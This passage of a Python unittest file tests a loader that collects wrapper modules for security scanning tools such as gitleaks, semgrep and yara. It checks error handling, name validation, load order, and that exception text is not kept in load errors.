        infos = [pkgutil.ModuleInfo(None, n, False) for n in names]
        stack.enter_context(mock.patch.object(tools.pkgutil, "iter_modules", return_value=infos))
        real_import = tools.importlib.import_module
        asked: "list[str]" = []

        def fake_import(name: str, package=None):
            asked.append(name)
            short = name.rpartition(".")[2]
            if short in modules:
                item = modules[short]
                if isinstance(item, type) and issubclass(item, BaseException):
                    raise item("secret path /etc/passwd from the message")
                if isinstance(item, BaseException):
                    raise item
                return item
            return real_import(name, package)

        stack.enter_context(mock.patch.object(tools.importlib, "import_module", fake_import))
        return asked

    def module(self, *wrappers: ToolWrapper, **attrs) -> types.ModuleType:
        mod = types.ModuleType("fake")
        mod.WRAPPERS = tuple(wrappers)
        for key, value in attrs.items():
            setattr(mod, key, value)
        return mod

    def test_collects_the_wrappers_of_every_module_ending_in_wrapper(self) -> None:
        a, b = wrapper_named("gitleaks"), wrapper_named("bandit")
        asked = self.install({"gitleaks_wrapper": self.module(a), "misc_wrapper": self.module(b)}, extra_names=("gitleaks", "scancode", "helper", "wrapper_x"))
        result = load_wrappers()
        self.assertIsInstance(result, WrapperSet)
        self.assertEqual(dict(result.wrappers), {"gitleaks": a, "bandit": b})
        self.assertEqual(result.load_errors, ())
        self.assertIs(result.get("gitleaks"), a)
        self.assertIs(result.get("bandit"), b)
        self.assertIsNone(result.get("semgrep"))
        self.assertEqual(sorted(asked), ["transit.tools.gitleaks_wrapper", "transit.tools.misc_wrapper"])   # the old programs are never imported

    def test_the_two_old_scripts_are_never_imported_with_the_real_package(self) -> None:
        asked: "list[str]" = []
        real = tools.importlib.import_module

        def spy(name, package=None):
            asked.append(name)
            return real(name, package)

        with mock.patch.object(tools.importlib, "import_module", spy):
            result = load_wrappers()
        self.assertFalse([n for n in asked if not n.endswith("_wrapper")], asked)
        self.assertNotIn("transit.tools.gitleaks", asked)
        self.assertNotIn("transit.tools.scancode", asked)
        self.assertIsInstance(result, WrapperSet)
        self.assertEqual(result.load_errors, (), "a wrapper module of the real package does not import")

    def test_the_real_package_loads_without_error_and_every_wrapper_is_a_known_tool(self) -> None:
        result = load_wrappers()
        self.assertEqual(result.load_errors, ())
        for name, wrapper in result.wrappers.items():
            self.assertIn(name, set(DIRECTORY_TOOLS) | set(FILE_TOOLS))
            self.assertEqual(wrapper.name, name)

    def test_a_module_that_fails_to_import_costs_its_own_tools_only(self) -> None:
        good = wrapper_named("trivy")
        self.install({"a_wrapper": ImportError, "b_wrapper": self.module(good), "c_wrapper": SystemExit, "d_wrapper": SyntaxError})
        result = load_wrappers()
        self.assertEqual(dict(result.wrappers), {"trivy": good})
        self.assertEqual(result.load_errors, ("a_wrapper:ImportError", "c_wrapper:SystemExit", "d_wrapper:SyntaxError"))
        self.assertNotIn("passwd", " ".join(result.load_errors))          # the text of the exception is never kept

    def test_a_module_without_wrappers_or_with_a_malformed_table_is_a_load_error(self) -> None:
        self.install({"a_wrapper": types.ModuleType("a"), "b_wrapper": types.ModuleType("b"), "c_wrapper": self.module(),
                      "d_wrapper": self.module(object()), "e_wrapper": self.module(wrapper_named("bandit"))})
        result = load_wrappers()
        self.assertEqual(result.load_errors, ("a_wrapper:no_WRAPPERS", "b_wrapper:no_WRAPPERS", "d_wrapper:invalid_WRAPPERS"))
        self.assertEqual(sorted(result.wrappers), ["bandit"])              # an empty tuple is fine: the module simply offers nothing

    def test_a_wrappers_attribute_that_is_not_a_tuple_is_a_load_error(self) -> None:
        mod = types.ModuleType("x")
        mod.WRAPPERS = [wrapper_named("yara")]
        self.install({"x_wrapper": mod})
        self.assertEqual(load_wrappers().load_errors, ("x_wrapper:invalid_WRAPPERS",))

    def test_two_wrappers_with_one_name_are_refused(self) -> None:
        self.install({"a_wrapper": self.module(wrapper_named("clamscan")), "b_wrapper": self.module(wrapper_named("clamscan"))})
        with self.assertRaises(ValueError):
            load_wrappers()

    def test_two_wrappers_of_one_name_in_one_module_are_refused(self) -> None:
        self.install({"a_wrapper": self.module(wrapper_named("clamscan"), wrapper_named("clamscan"))})
        with self.assertRaises(ValueError):
            load_wrappers()

    def test_a_name_that_is_not_a_known_tool_is_refused(self) -> None:
        for bad in ("nmap", "", "Gitleaks", "semgrep-ts"):
            cls = type("Bad", (DirWrapper,), {"name": bad})
            with contextlib.ExitStack() as stack:
                self.install({"a_wrapper": self.module(cls())}, stack=stack)
                with self.assertRaises(ValueError, msg=repr(bad)):
                    load_wrappers()

    def test_both_kinds_of_name_are_accepted(self) -> None:
        directory, per_file = wrapper_named("semgrep"), wrapper_named("semgrep-js")
        self.install({"a_wrapper": self.module(directory, per_file)})
        self.assertEqual(dict(load_wrappers().wrappers), {"semgrep": directory, "semgrep-js": per_file})

    def test_modules_are_loaded_in_name_order_so_that_load_errors_are_stable(self) -> None:
        self.install({"z_wrapper": ImportError, "a_wrapper": ImportError, "m_wrapper": ImportError})
        self.assertEqual(load_wrappers().load_errors, ("a_wrapper:ImportError", "m_wrapper:ImportError", "z_wrapper:ImportError"))

    def test_importing_the_package_has_no_side_effect_and_loads_nothing(self) -> None:
        code = ("import sys\nsys.path.insert(0, %r)\nimport transit.tools\n"
                "print(sorted(m for m in sys.modules if m.startswith('transit.tools')))\n" % str(ROOT))
        result = run_process([PY, "-I", "-c", code], env={}, timeout_s=30, cwd=str(ROOT))
        self.assertEqual(result.stdout.decode().strip(), "['transit.tools']")
        self.assertEqual(result.stderr, b"")


class WrapperSetTests(unittest.TestCase):
    def test_get_is_a_plain_lookup(self) -> None:
        w = wrapper_named("yara")
        ws = WrapperSet(wrappers=types.MappingProxyType({"yara": w}))
        self.assertIs(ws.get("yara"), w)
        self.assertIsNone(ws.get("gitleaks"))
        self.assertIsNone(ws.get(""))
        self.assertEqual(ws.load_errors, ())

    def test_the_abstract_wrapper_cannot_be_instantiated(self) -> None:
        with self.assertRaises(TypeError):
            ToolWrapper()  # type: ignore[abstract]


if __name__ == "__main__":
    unittest.main()
